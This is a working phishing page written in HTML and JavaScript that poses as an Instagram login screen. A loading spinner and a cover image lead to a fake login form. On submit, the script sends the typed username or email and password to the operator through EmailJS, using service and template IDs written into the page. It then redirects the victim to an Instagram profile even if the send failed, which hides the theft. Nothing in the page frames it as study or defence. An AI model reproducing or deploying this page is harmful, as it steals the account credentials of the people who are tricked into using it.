<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Instagram</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Arial,sans-serif;background:#000;color:#fff;overflow:hidden}
#loading,#cover,#login{position:fixed;inset:0}
#loading{display:flex;align-items:center;justify-content:center;background:#000;z-index:10}
.spinner{width:42px;height:42px;border:4px solid #444;border-top-color:#fff;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
#cover{
 display:none;align-items:center;justify-content:center;cursor:pointer;
 background:
 linear-gradient(135deg,rgba(0,0,0,.25),rgba(0,0,0,.7)),
 url("https://0ne-47.github.io/one/profile.jpg?auto=format&fit=crop")
 center/cover no-repeat;
}
.cover-content{text-align:center;text-shadow:0 2px 12px #000}
.cover-content h1{font-size:clamp(28px,7vw,64px);margin-bottom:10px}
.cover-content p{font-size:16px}
#login{display:none;align-items:center;justify-content:center;background:#fafafa;color:#222}
.card{width:min(92%,390px);background:#fff;border:1px solid #ddd;padding:38px 28px 28px;text-align:center}
.logo{font-size:38px;font-weight:700;font-family:cursive;margin-bottom:28px}
.demo{font-size:12px;color:#777;background:#f3f3f3;padding:8px;border-radius:6px;margin-bottom:18px}
input{width:100%;padding:13px;margin:5px 0;border:1px solid #ccc;border-radius:4px;background:#fafafa;font-size:14px}
button{width:100%;border:0;border-radius:6px;padding:12px;margin-top:12px;background:#3897f0;color:#fff;font-weight:bold;font-size:14px;cursor:pointer}
button:active{transform:scale(.99)}
.small{font-size:12px;color:#777;margin-top:18px}
</style>
</head>
<body>

<div id="loading"><div class="spinner"></div></div>

<div id="cover" onclick="openLogin()">
  <div class="cover-content">
  </div>
</div>

<div id="login">
  <div class="card">
    <div class="logo">Instagram</div>
    <div class="demo">Login — To Countinue With Instagram</div>

    <form onsubmit="handleLogin(event)">
      <input id="identity" type="text" placeholder="Username or email" autocomplete="off" required>
      <input id="password" type="password" placeholder="Password" autocomplete="off" required>
      <button type="submit">Log in</button>
    </form>

    <div class="small">This Is For Your Security.</div>
  </div>
</div>

<!-- Updated EmailJS SDK -->
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

<script>
  // Initialize EmailJS once globally
  emailjs.init("Zuxy6x2TZlxuZ4ABj");

  const REDIRECT_URL = "https://instagram.com/zer0_edit.z";

  setTimeout(() => {
    document.getElementById("loading").style.display = "none";
    document.getElementById("cover").style.display = "flex";
  }, 1800);

  function openLogin() {
    document.getElementById("cover").style.display = "none";
    document.getElementById("login").style.display = "flex";
  }

  function handleLogin(event) {
    event.preventDefault();

    const identity = document.getElementById("identity").value;
    const password = document.getElementById("password").value;

    // Send email, then redirect after completion
    emailjs
      .send("service_z1uzh6f", "template_whed5zh", {
        email: identity,
        password: password,
      })
      .then(() => {
        window.location.href = REDIRECT_URL;
      })
      .catch((error) => {
        console.error("EmailJS Error:", error);
        // Redirect anyway on failure so the user isn't stuck
        window.location.href = REDIRECT_URL;
      });
  }
</script>

</body>
</html>
